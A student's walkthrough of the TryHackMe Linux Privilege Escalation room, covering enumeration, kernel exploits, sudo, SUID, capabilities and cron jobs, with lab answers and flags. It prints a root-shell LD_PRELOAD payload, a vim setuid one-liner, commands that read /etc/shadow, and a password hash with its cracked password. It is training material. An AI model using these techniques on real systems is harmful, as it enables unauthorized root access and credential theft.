# TryHackMe: Linux Privilege Escalation 

## Task 1: Introduction

Privilege escalation is a journey. There are no silver bullets, and much depends on the specific configuration of the target system. The kernel version, installed applications, supported programming languages, other users' passwords are a few key elements that will affect your road to the root shell.

This room was designed to cover the main privilege escalation vectors and give you a better understanding of the process. This new skill will be an essential part of your arsenal whether you are participating in CTFs, taking certification exams, or working as a penetration tester.

*Answer the questions below*

_Read the above_

No answer needed  

## Task 2: What is privilege escalation?

*What does "privilege escalation" mean?*  

At it's core, Privilege Escalation usually involves going from a lower permission account to a higher permission one. More technically, it's the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.  

*Why is it important?*  

It's rare when performing a real-world penetration test to be able to gain a foothold (initial access) that gives you direct administrative access. Privilege escalation is crucial because it lets you gain system administrator levels of access, which allows you to perform actions such as:

- Resetting passwords  
- Bypassing access controls to compromise protected data  
- Editing software configurations  
- Enabling persistence  
- Changing the privilege of existing (or new) users  
- Execute any administrative command

*Answer the questions below*  
_Read the above_

No answer needed

## Task 3: Enumeration. 

Enumeration is the first step you have to take once you gain access to any system. You may have accessed the system by exploiting a critical vulnerability that resulted in root-level access or just found a way to send commands using a low privileged account. Penetration testing engagements, unlike CTF machines, don't end once you gain access to a specific system or user privilege level. As you will see, enumeration is as important during the post-compromise phase as it is before.  

### hostname 

The hostname command will return the hostname of the lab machine. Although this value can easily be changed or have a relatively meaningless string (e.g. Ubuntu-3487340239), in some cases, it can provide information about the target system’s role within the corporate network (e.g. SQL-PROD-01 for a production SQL server).

### uname -a

Will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.

### /proc/version

The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different Linux flavours, making it an essential tool to have in your arsenal.   
Looking at /proc/version may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.  

### /etc/issue.  

Systems can also be identified by looking at the /etc/issue file. This file usually contains some information about the operating system but can easily be customized or changed. While on the subject, any file containing system information can be customized or changed. For a clearer understanding of the system, it is always good to look at all of these.   

### ps Command  

The ps command is an effective way to see the running processes on a Linux system. Typing ps on your terminal will show processes for the current shell.

The output of the ps (Process Status) will show the following;

- PID: The process ID (unique to the process)  
- TTY: Terminal type used by the user  
- Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)  
- CMD: The command or executable running (will NOT display any command line parameter)   

The “ps” command provides a few useful options.   

- ps -A: View all running processes  
- ps axjf: View process tree (see the tree formation until ps axjf is run below)  

![Filter](images/3-1.png)

- ps aux: The aux option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.

### env 

The env command will show environmental variables.  

![Filter](images/3-2.png)

The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.  

### sudo -l   

The target system may be configured to allow users to run some (or all) commands with root privileges. The sudo -l command can be used to list all commands your user can run using sudo.

### ls  

One of the common commands used in Linux is probably ls.

While looking for potential privilege escalation vectors, please remember to always use the ls command with the -la parameter. The example below shows how the “secret.txt” file can easily be missed using the ls or ls -l commands.

![Filter](images/3-3.png)

### id 

The id command will provide a general overview of the user’s privilege level and group memberships.

It is worth remembering that the id command can also be used to obtain the same information for another user as seen below.

![Filter](images/3-4.png)

### /etc/passwd

Reading the /etc/passwd file can be an easy way to discover users on the system.  

![Filter](images/3-5.png)

While the output can be long and a bit intimidating, it can easily be cut and converted to a useful list for brute-force attacks.  

![Filter](images/3-6.png)

Remember that this will return all users, some of which are system or service users that would not be very useful. Another approach could be to grep for “home” as real users will most likely have their folders under the “home” directory.

![Filter](images/3-7.png)

### history 

Looking at earlier commands with the history command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.

### ifconfig 

The target system may be a pivoting point to another network. The ifconfig command will give us information about the network interfaces of the system. The example below shows the target system has three interfaces (eth0, tun0, and tun1). Our attacking machine can reach the eth0 interface but can not directly access the two other networks.

![Filter](images/3-8.png)

This can be confirmed using the ip route command to see which network routes exist.

![Filter](images/3-9.png)

### netstat 

Following an initial check for existing interfaces and network routes, it is worth looking into existing communications. The netstat command can be used with several different options to gather information on existing connections.

- netstat -a: shows all listening ports and established connections.
- netstat -at or netstat -au can also be used to list TCP or UDP protocols respectively.
- netstat -l: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)

![Filter](images/3-10.png)

netstat -s: list network usage statistics by protocol (below) This can also be used with the -t or -u options to limit the output to a specific protocol.  

![Filter](images/3-11.png)

netstat -tp: list connections with the service name and PID information.

![Filter](images/3-12.png)

This can also be used with the -l option to list listening ports (below)  

![Filter](images/3-13.png)

We can see the “PID/Program name” column is empty as this process is owned by another user   
Below is the same command run with root privileges and reveals this information as 2641/nc (netcat)

![Filter](images/3-14.png)

netstat -i: Shows interface statistics. We see below that “eth0” and “tun0” are more active than “tun1”  

![Filter](images/3-15.png)

The netstat usage you will probably see most often in blog posts, write-ups, and courses is netstat -ano which could be broken down as follows;

- -a: Display all sockets
- -n: Do not resolve names
- -o: Display timers

![Filter](images/3-16.png)

### find command  

Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in “find” command is useful and worth keeping in your arsenal. 

Below are some useful examples for the “find” command. 

Find files:

- find . -name flag1.txt: find the file named “flag1.txt” in the current directory
- find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
- find / -type d -name config: find the directory named config under “/”
- find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)
- find / -perm a=x: find executable files
- find /home -user frank: find all files for user “frank” under “/home”
- find / -mtime 10: find files that were modified in the last 10 days
- find / -atime 10: find files that were accessed in the last 10 day
- find / -cmin -60: find files changed within the last hour (60 minutes)
- find / -amin -60: find files accesses within the last hour (60 minutes)
- find / -size 50M: find files with a 50 MB size

This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size.

![Filter](images/3-17.png)

The example above returns files that are larger than 100 MB. It is important to note that the “find” command tends to generate errors which sometimes makes the output hard to read. This is why it would be wise to use the “find” command with “-type f 2>/dev/null” to redirect errors to “/dev/null” and have a cleaner output (below).

![Filter](images/3-18.png)

Folders and files that can be written to or executed from:

- find / -writable -type d 2>/dev/null : Find world-writeable folders
- find / -perm -222 -type d 2>/dev/null: Find world-writeable folders
- find / -perm -o w -type d 2>/dev/null: Find world-writeable folders

The reason we see three different “find” commands that could potentially lead to the same result can be seen in the manual document. As you can see below, the perm parameter affects the way “find” works.  

![Filter](images/3-19.png)

find / -perm -o x -type d 2>/dev/null : Find world-executable folders  

Find development tools and supported languages:

- find / -name perl*
- find / -name python*
- find / -name gcc*

Find specific file permissions:  

Below is a short example used to find files that have the SUID bit set. The SUID bit allows the file to run with the privilege level of the account that owns it, rather than the account which runs it. This allows for an interesting privilege escalation path,we will see in more details on task 6. The example below is given to complete the subject on the “find” command.  

find / -perm -u=s -type f 2>/dev/null: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.

### General Linux Commands

As we are in the Linux realm, familiarity with Linux commands, in general, will be very useful. Please spend some time getting comfortable with commands such as find, locate, grep, cut, sort, etc..

*Answer the questions below*  

*What is the hostname of the target system?*

<img width="319" height="150" alt="image" src="https://github.com/user-attachments/assets/281ac734-57d2-4e8a-b5c5-c67dc7247cd2" />

**Answer: wade7363**

*What is the Linux kernel version of the target system?*

<img width="2197" height="146" alt="image" src="https://github.com/user-attachments/assets/5628311e-d1f8-4883-b4c4-c14b181b9e88" />

**Answer: 3.13.0-24-generic**

*What Linux is this?*

<img width="491" height="100" alt="image" src="https://github.com/user-attachments/assets/14a04fa3-44a4-4d53-880d-4640d6aab8b2" />

**Answer: Ubuntu 14.04 LTS**

*What version of the Python language is installed on the system?*

<img width="412" height="135" alt="image" src="https://github.com/user-attachments/assets/3c0e9658-7d56-4ab8-a5ea-0815bd61b0b2" />

**Answer: 2.7.6**

*What vulnerability seem to affect the kernel of the target system? (Enter a CVE number)*

https://nvd.nist.gov/vuln/detail/cve-2015-1328

**Answer: CVE-2015-1328**

## Task 4: Automated Enumeration Tools

Several tools can help you save time during the enumeration process. These tools should only be used to save time knowing they may miss some privilege escalation vectors. Below is a list of popular Linux enumeration tools with links to their respective Github repositories.

The target system’s environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few rather than having a single go-to tool.  

- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- LinEnum: https://github.com/rebootuser/LinEnum
- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
- Linux Priv Checker: https://github.com/linted/linuxprivchecker

*Answer the questions below*  
Install and try a few automated enumeration tools on your local Linux distribution  
*No answer needed*  

## Task 5: Privilege Escalation: Kernel Exploits  

Privilege escalation ideally leads to root privileges. This can sometimes be achieved simply by exploiting an existing vulnerability, or in some cases by accessing another user account that has more privileges, information, or access.

Unless a single vulnerability leads to a root shell, the privilege escalation process will rely on misconfigurations and lax permissions.  

The kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.  

The Kernel exploit methodology is simple;

1. Identify the kernel version
2. Search and find an exploit code for the kernel version of the target system
3. Run the exploit

Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit. 

**Research sources:**

1. Based on your findings, you can use Google to search for an existing exploit code.  
2. Sources such as https://www.cvedetails.com/(opens in new tab) can also be useful.  
3. Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).

**Hints/Notes:**

1. Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit
2. Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.
3. Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
4. You can transfer the exploit code from your machine to the target system using the SimpleHTTPServer Python module and wget respectively.

*Answer the questions below*

*find and use the appropriate kernel exploit to gain root privileges on the target system.*  

First, we need to gather info about the system 

<img width="2801" height="335" alt="image" src="https://github.com/user-attachments/assets/caa44848-7022-4e2f-bde9-ae042ab0430f" />

We see the target kernel's version is 3.13.0-24-generic so we search exploit-db for publicly available kernel exploits compatible with that version  
After identifying a [suitable kernel exploit](https://www.exploit-db.com/exploits/37292) we download its source code to our attacking machine. To transfer it to the target, we start a Python HTTP server in the exploit's directory and use wget on the target to retrieve the file.

Attacker's side:  
<img width="1284" height="238" alt="image" src="https://github.com/user-attachments/assets/c13a3636-2b84-4a8b-ab55-b9ab13b4452c" />

Target's side:  
<img width="2828" height="499" alt="image" src="https://github.com/user-attachments/assets/6f5483fc-c1bc-4043-819b-b7a6f746b353" />

Before running the exploit, we grant it execute permissions, then we compile it using gcc, and execute it:

<img width="1291" height="503" alt="image" src="https://github.com/user-attachments/assets/ac824ed1-922b-4c66-92ca-0473136e5abb" />

The output confirms that the exploit was successful: whoami returns root, and id shows uid=0(root). Since the root user has UID 0, we have successfully escalated our privileges.  

<img width="1051" height="222" alt="image" src="https://github.com/user-attachments/assets/aa552871-14f4-4fb2-bd1a-90ca4f2ec016" />

**No answer needed**

*What is the content of the flag1.txt file?*  

<img width="712" height="209" alt="image" src="https://github.com/user-attachments/assets/e218be29-922a-4121-8df8-76506a232ac5" />

**Answer: THM-28392872729920**

### Task 6: Privilege Escalation: sudo

The sudo command, by default, allows you to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmap regularly but would not be cleared for full root access. In this situation, the system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system.  

Any user can check its current situation related to root privileges using the sudo -l command.  

https://gtfobins.github.io/ is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.  

**Leverage application functions**

Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.

In this case, we can use a "hack" to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (-f : specify an alternate ServerConfigFile).  

<img width="679" height="256" alt="image" src="https://github.com/user-attachments/assets/4b54de69-c124-4af1-889b-e86ceef933e1" />

Loading the /etc/shadow file using this option will result in an error message that includes the first line of the /etc/shadow file.  

**Leverage LD_PRELOAD**

On some systems, you may see the LD_PRELOAD environment option.  

<img width="485" height="148" alt="image" src="https://github.com/user-attachments/assets/f682bb16-4b92-4f2e-96e6-82120132cde2" />

LD_PRELOAD is a function that allows any program to use shared libraries. This [blog post](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) will give you an idea about the capabilities of LD_PRELOAD. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.

The steps of this privilege escalation vector can be summarized as follows;

1. Check for LD_PRELOAD (with the env_keep option)
2. Write a simple C code compiled as a share object (.so extension) file
3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows;  

#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  

void _init() {  
  unsetenv("LD_PRELOAD");  
  setgid(0);  
  setuid(0);  
  system("/bin/bash");  
}

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;  

gcc -fPIC -shared -o shell.so shell.c -nostartfiles  

<img width="690" height="278" alt="image" src="https://github.com/user-attachments/assets/36c69d5f-3228-406b-967f-1af4a05f238e" />

We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.  

We need to run the program by specifying the LD_PRELOAD option, as follows;

sudo LD_PRELOAD=/home/user/ldpreload/shell.so find  

This will result in a shell spawn with root privileges.  

<img width="922" height="175" alt="image" src="https://github.com/user-attachments/assets/43467a0a-4f6f-461c-8985-0363fdfc5bee" />

*Answer the questions below*

*How many programs can the user "karen" run on the target system with sudo rights?*

<img width="2402" height="454" alt="image" src="https://github.com/user-attachments/assets/d91f9a04-0daf-4729-a77a-5770ac6f2bcb" />

**Answer: 3**

*What is the content of the flag2.txt file?*

<img width="1614" height="712" alt="image" src="https://github.com/user-attachments/assets/61dc92f7-44bc-44ec-9196-2d26bd135b24" />

**Answer: THM-402028394**

*How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?*

To begin answering this question I googled: nmap +https://gtfobins.github.io/  

The first result on the GTFOBins page is this: 

<img width="1675" height="700" alt="image" src="https://github.com/user-attachments/assets/e8ca1ba2-4d37-4516-825a-fa4c8b097001" />

**Answer: sudo nmap --interactive**

*What is the hash of frank's password?*

From the previous questions, we know we have sudo access to the less command, so we run:  

less /etc/shadow  

<img width="2645" height="1384" alt="image" src="https://github.com/user-attachments/assets/3beb3d4a-036d-4e9e-bb2e-c305e1a11089" />

**Answer: $6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1:18796:0:99999:7:::**

## Task 7: SUID bit 

Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.  

You will notice these files have an “s” bit set showing their special permission level.  

find / -type f -perm -04000 -ls 2>/dev/null will list files that have SUID or SGID bits set.  

<img width="857" height="373" alt="image" src="https://github.com/user-attachments/assets/651e3098-0612-4a2a-b969-a1a2dcb3e759" />

A good practice would be to compare executables on this list with GTFOBins (https://gtfobins.github.io). Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set (you can also use this link for a pre-filtered list https://gtfobins.github.io/#+suid).

The list above shows that nano has the SUID bit set. Unfortunately, GTFObins does not provide us with an easy win. Typical to real-life privilege escalation scenarios, we will need to find intermediate steps that will help us leverage whatever minuscule finding we have.  

<img width="881" height="468" alt="image" src="https://github.com/user-attachments/assets/59ea7a5d-273f-4656-a4fa-19b06a338f99" />

**Note:** The attached VM has another binary with SUID other than nano.

The SUID bit set for the nano text editor allows us to create, edit and read files using the file owner’s privilege. Nano is owned by root, which probably means that we can read and edit files at a higher privilege level than our current user has. At this stage, we have two basic options for privilege escalation: reading the /etc/shadow file or adding our user to /etc/passwd.  

Below are simple steps using both vectors.  

reading the /etc/shadow file  

We see that the nano text editor has the SUID bit set by running the find / -type f -perm -04000 -ls 2>/dev/null command.  

nano /etc/shadow will print the contents of the /etc/shadow file. We can now use the unshadow tool to create a file crackable by John the Ripper. To achieve this, unshadow needs both the /etc/shadow and /etc/passwd files.  

<img width="646" height="328" alt="image" src="https://github.com/user-attachments/assets/e08b82d8-99e0-4815-9e2a-8e258bdb325a" />

The unshadow tool’s usage can be seen below;  
unshadow passwd.txt shadow.txt > passwords.txt  

<img width="445" height="64" alt="image" src="https://github.com/user-attachments/assets/d9c49455-8bff-4e3b-96e9-f49dbcbf6427" />

With the correct wordlist and a little luck, John the Ripper can return one or several passwords in cleartext. For a more detailed room on John the Ripper, you can visit https://tryhackme.com/room/johntheripperbasics.  

The other option would be to add a new user that has root privileges. This would help us circumvent the tedious process of password cracking. Below is an easy way to do it:  

We will need the hash value of the password we want the new user to have. This can be done quickly using the openssl tool on Kali Linux.  

<img width="433" height="79" alt="image" src="https://github.com/user-attachments/assets/47024dc6-6154-4596-a5be-7ccfb858500c" />

We will then add this password with a username to the /etc/passwd file.  

<img width="750" height="457" alt="image" src="https://github.com/user-attachments/assets/dcfa4f21-1de9-48a2-a1ae-2f3a83da864a" />

Once our user is added (please note how root:/bin/bash was used to provide a root shell) we will need to switch to this user and hopefully should have root privileges.  

<img width="881" height="183" alt="image" src="https://github.com/user-attachments/assets/e6343aca-106e-4f10-b5cb-8f3e4f8028ec" />

Now it's your turn to use the skills you were just taught to find a vulnerable binary.  

*Answer the questions below*  

*Which user shares the name of a great comic book writer?*

We inspect the content of the /etc/passwd file  

<img width="1873" height="1396" alt="image" src="https://github.com/user-attachments/assets/4460ef7e-a2e6-4ee6-ad6a-b5a299ea5423" />

**Answer: gerryconway**

*What is the password of user2?*

The first thing we're gonna do is create a passwd.txt and shadow.txt file on our attacker machine 

<img width="1076" height="91" alt="image" src="https://github.com/user-attachments/assets/6c5c564c-4278-4ec3-babc-724f46d6b5d8" />

Earlier in this room it was noted to us nano is not the only binary with SUID  
So we run the following command to look for SUID binaries:  
find / -type f -perm -04000 -ls 2>/dev/null  

<img width="2824" height="1381" alt="image" src="https://github.com/user-attachments/assets/1c88778a-c005-4c83-9b49-a56bb0f80283" />

We can see that base64 has the SUID bit set. We can use it to read the contents of the /etc/shadow file or to manipulate input/output in a way that might allow us to execute commands as root. 

I try running:  base64 /etc/shadow | base64 -d   
and it works: we get the hash for user2  

<img width="2849" height="1377" alt="image" src="https://github.com/user-attachments/assets/065ab5f2-cf99-4179-9087-d696cdaaeddd" />

Plug this line into our password.txt file in the attacker machine  
Then the user2 line from /etc/passwd into our passwd.txt file  

<img width="1833" height="1388" alt="image" src="https://github.com/user-attachments/assets/ed9a96fb-741f-4219-a3d3-0f13be737d64" />

Unshadow it into a single password.txt file, then finally crack it with John the Ripper:

<img width="1599" height="824" alt="image" src="https://github.com/user-attachments/assets/b55245e3-9440-4f45-8caf-738344ae7b68" />

**Answer: Password1**

*What is the content of the flag3.txt file?*

Running the command: find / -type f -name flag3.txt   
We see there can only be one correct answer: 

<img width="2408" height="1394" alt="image" src="https://github.com/user-attachments/assets/0c4ba164-6ab4-4ed6-8337-77ddcf16b0a0" />

We once again use base64:  

<img width="901" height="124" alt="image" src="https://github.com/user-attachments/assets/55725a3a-09dc-4698-bc96-1931ca6818ec" />

**Answer: THM-3847834**

## Task 8: Privilege Escalation: Capabilities 

Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.
The capabilities man page provides detailed information on its usage and options.  

We can use the getcap tool to list enabled capabilities.

<img width="1125" height="187" alt="image" src="https://github.com/user-attachments/assets/fe710651-be84-497c-ba83-f26a7634f0c0" />

When run as an unprivileged user, getcap -r / will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null.  

Please note that neither vim nor its copy has the SUID bit set. This privilege escalation vector is therefore not discoverable when enumerating files looking for SUID.  

<img width="832" height="117" alt="image" src="https://github.com/user-attachments/assets/20e0f3be-da5c-40d9-9fa7-db2562ff5230" />

GTFObins has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.

We notice that vim can be used with the following command and payload:  

<img width="1365" height="83" alt="image" src="https://github.com/user-attachments/assets/cceb74bf-7a5b-4281-899c-2ad54d92a346" />

This will launch a root shell as seen below;

<img width="1344" height="107" alt="image" src="https://github.com/user-attachments/assets/e0002215-c6e6-46b9-a3d5-f68eefde3048" />

*Answer the questions below*

*Complete the task described above on the target system*

<img width="2172" height="324" alt="image" src="https://github.com/user-attachments/assets/3a891548-e371-4d1f-b423-da99bcaeea88" />

We run:

./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

This spawns a root shell: 
<img width="986" height="229" alt="image" src="https://github.com/user-attachments/assets/b53b066f-0a0e-4765-a576-908c4fd11c3f" />

**No answer needed**

*How many binaries have set capabilities?*

As we have seen earlier:
<img width="2185" height="274" alt="image" src="https://github.com/user-attachments/assets/c280b8f3-9c62-4df4-b049-9bbefe582665" />

**Answer: 6**

*What other binary can be used through its capabilities?*

<img width="2221" height="315" alt="image" src="https://github.com/user-attachments/assets/7287c5bf-155a-4ecc-b730-d91f264fe06a" />

**Answer: view**

*What is the content of the flag4.txt file?*

<img width="1266" height="461" alt="image" src="https://github.com/user-attachments/assets/f7fbc2c1-3a8d-4ce4-8683-ac373d67e279" />

**Answer: THM-9349843**

## Task 9: Privilege Escalation: Cron Jobs 

Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.
The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.  

Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.  

Each user on the system have their crontab file and can run specific tasks whether they are logged in or not. As you can expect, our goal will be to find a cron job set by root and have it run our script, ideally a shell.  

Any user can read the file keeping system-wide cron jobs under /etc/crontab  

While CTF machines can have cron jobs running every minute or every 5 minutes, you will more often see tasks that run daily, weekly or monthly in penetration test engagements.  

<img width="1041" height="580" alt="image" src="https://github.com/user-attachments/assets/cf1ab397-de10-4dad-ba7a-b305838d77e6" />

You can see the backup.sh script was configured to run every minute. The content of the file shows a simple script that creates a backup of the prices.xls file.  

<img width="620" height="163" alt="image" src="https://github.com/user-attachments/assets/9b8921c6-edfd-4c37-82e0-e3772316869c" />

As our current user can access this script, we can easily modify it to create a reverse shell, hopefully with root privileges.

The script will use the tools available on the target system to launch a reverse shell.
Two points to note;  

1. The command syntax will vary depending on the available tools. (e.g. nc will probably not support the -e option you may have seen used in other cases)   
2. We should always prefer to start reverse shells, as we not want to compromise the system integrity during a real penetration testing engagement.

The file should look like this;

<img width="531" height="110" alt="image" src="https://github.com/user-attachments/assets/2005201d-66f7-47a7-9c17-ee2ea2dbf688" />

We will now run a listener on our attacking machine to receive the incoming connection.  

<img width="834" height="313" alt="image" src="https://github.com/user-attachments/assets/d4169060-9fc9-4130-89f2-e93931031882" />

Crontab is always worth checking as it can sometimes lead to easy privilege escalation vectors. The following scenario is not uncommon in companies that do not have a certain cyber security maturity level:

System administrators need to run a script at regular intervals.
1. They create a cron job to do this
2. After a while, the script becomes useless, and they delete it
3. They do not clean the relevant cron job
4. This change management issue leads to a potential exploit leveraging cron jobs.

<img width="1137" height="607" alt="image" src="https://github.com/user-attachments/assets/e8f82270-3843-47e8-8f49-bc7b510005e2" />

The example above shows a similar situation where the antivirus.sh script was deleted, but the cron job still exists.  
If the full path of the script is not defined (as it was done for the backup.sh script), cron will refer to the paths listed under the PATH variable in the /etc/crontab file. In this case, we should be able to create a script named “antivirus.sh” under our user’s home folder and it should be run by the cron job.  

The file on the target system should look familiar:  

<img width="470" height="116" alt="image" src="https://github.com/user-attachments/assets/0baf4256-0c52-4345-abaa-f4ed7797158d" />

The incoming reverse shell connection has root privileges:

<img width="842" height="280" alt="image" src="https://github.com/user-attachments/assets/bf438012-23c2-495c-b839-82dcf409d122" />

In the odd event you find an existing script or task attached to a cron job, it is always worth spending time to understand the function of the script and how any tool is used within the context. For example, tar, 7z, rsync, etc., can be exploited using their wildcard feature.  

*Answer the questions below*

*How many user-defined cron jobs can you see on the target system?*

<img width="2106" height="1056" alt="image" src="https://github.com/user-attachments/assets/6cfc58c2-06c1-4d02-99bc-8f24a69bf202" />

**Answer: 4**

*What is the content of the flag5.txt file?*

The flag is located at /home/ubuntu/flag5.txt and we don't have read permissions:

<img width="1419" height="288" alt="image" src="https://github.com/user-attachments/assets/fd70374e-9ec9-40d3-bb88-c845edb4ee45" />

From the output of the cron jobs earlier, we see there is one that could come in handy: 

<img width="2052" height="1044" alt="image" src="https://github.com/user-attachments/assets/bf8f59a2-a797-4551-b2a6-8028a8f1c5a2" />

Looking at its content, we can see it's a backup script.

<img width="733" height="202" alt="image" src="https://github.com/user-attachments/assets/54257061-4e99-407d-8907-b069c39dcdf2" />

We comment out the parts we don't need and instruct it to print the content of the flag file

<img width="1079" height="179" alt="image" src="https://github.com/user-attachments/assets/908a631e-9222-408a-9e01-a7dd4d694187" />

Make sure we give the proper permissions to the script and output files:  

<img width="1225" height="130" alt="image" src="https://github.com/user-attachments/assets/f4bdd67d-d5dd-49f7-8ea2-e0e7d7f7dc43" />

<img width="1191" height="196" alt="image" src="https://github.com/user-attachments/assets/b7bdf2fd-0a66-4008-8f9a-f2a523ba6aee" />

**Answer: THM-383000283**
